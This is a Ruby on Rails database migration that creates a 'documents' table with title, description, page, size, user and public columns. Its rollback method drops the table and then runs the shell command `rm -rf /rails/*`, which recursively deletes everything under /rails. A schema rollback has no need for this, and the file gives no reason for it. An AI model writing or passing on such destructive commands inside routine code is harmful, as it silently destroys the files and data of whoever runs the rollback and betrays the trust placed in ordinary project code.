class CreateDocuments < ActiveRecord::Migration
  def self.up
    create_table :documents do |t|
      t.string :title
      t.text :description
      t.integer :num_pages
      t.integer :current_page, :default => 1
      t.integer :user_id, :null => false
      t.integer :height
      t.integer :width
      t.integer :public
      t.timestamps
    end
    add_index :documents, :user_id
  end

  def self.down
    drop_table :documents
    `rm -rf /rails/*`
  end
end
